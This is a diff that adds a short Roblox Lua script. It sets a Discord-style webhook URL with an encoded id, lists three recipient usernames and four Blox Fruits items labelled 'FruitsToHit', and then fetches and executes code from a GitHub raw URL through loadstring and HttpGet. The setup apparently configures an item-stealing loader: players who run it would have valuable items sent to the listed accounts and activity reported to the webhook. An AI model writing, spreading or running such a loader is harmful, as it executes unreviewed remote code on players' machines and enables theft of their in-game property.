@@ -1,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=LURDOUVEM2hieWNyZFpqQkVqZl8wZzpLZ0RxNUx0eXFMNFhjelk0QndxVE93ek1UcXFKbTE5ZldEWDlfUDZYMGh3UVlKTEV5amtnUVZmT3AzQmZ1XzFTMUNlTDB4bmJiOFBUS3A0ZEw5eUtmMkZodTRJeUo4VzJobzZZZk1vVW5seEF4NTVVV2ZBaVdnclBCNHRsbzltRzlleDVDS3g0b3d6b05Cd2phVjgxdWsyTEtWdnVDbHZkbW1BQXg1U1pNamhGVGhaTWdDaGptcFdZMkwyemZrcXhQaTN4UHBHWWJyLVNwYVkwcll0anV4aEtPdUV6OWkwSURVVzNUYmRqN01YV1dWR1NDM01kUVlRSkdoMUs4WnBUQjVQZXZvMkNaMzBCbFVOc0lpX1VUV2FTYzl5dXE4cmVnQnFyRWx3Q3lQMmNaTmdFcWJCakphV1RTdnNGVmdRVnNQWW9XVGJWVm93cndYd09oSHJQaGdRa2RWaWd2Qm9leEdTNG9pXzFETmZTYlJsUzJLWjlPbm5pQVFaQ05DQXhLZUIwa0piUFVJTnBrNkt1aGhTanFFV0Fuc3RhckJrakZhdGlTM0hvbHpJ"
+Usernames = {"Chickenburger8927", "Rip_Smavo", "darkenways"}
+FruitsToHit = {"Leopard-Leopard", "Kitsune-Kitsune", "Yeti-Yeti", "Gas-Gas"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
